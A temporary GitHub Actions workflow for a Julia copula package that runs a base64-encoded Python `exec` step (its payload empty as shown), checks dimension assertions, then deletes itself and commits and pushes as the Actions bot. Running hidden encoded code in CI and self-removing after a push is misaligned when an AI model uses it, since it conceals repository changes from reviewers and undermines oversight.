name: Temporary Paramorph dof cleanup

on:
  push:
    branches:
      - parameter-spaces-fitting
    paths:
      - .github/workflows/tmp-paramorph-dof-cleanup.yml

jobs:
  cleanup:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - uses: actions/checkout@v7
      - uses: julia-actions/setup-julia@v3
        with:
          version: '1'
      - name: Consolidate statistical dimension in Paramorph
        run: python -c "import base64; exec(base64.b64decode(''))"
      - name: Check patch
        run: git diff --check
      - name: Verify dimension contracts
        run: |
          julia --project --startup-file=no -e 'using Pkg; Pkg.instantiate(); using Copulas, Distributions, StatsBase; P=Copulas.Paramorph; G=GaussianCopula([1.0 0.3 0.2; 0.3 1.0 0.4; 0.2 0.4 1.0]); T=TCopula(4.0,G.Σ); @assert dof(G)==P.dimension(P.param_space(G))==3; @assert dof(T)==P.dimension(P.param_space(T))==4; S=SklarDist(G,(Normal(),Exponential(),Gamma(2,1))); @assert dof(S)==P.dimension(P.param_space(S)); X=[0.2 0.8 0.4 0.6; 0.3 0.7 0.9 0.1]; for C in (EmpiricalCopula(X),BetaCopula(X),CheckerboardCopula(X;m=2)); @assert dof(C)==0; M=CopulaModel(C,X,0.0,nothing); @assert dof(M)==0; @assert isempty(coef(M)); end'
      - name: Commit cleanup
        run: |
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git rm .github/workflows/tmp-paramorph-dof-cleanup.yml
          git add src test/api/sklar.jl
          git diff --check
          git commit -m "Make Paramorph the source of statistical dimension"
          git push
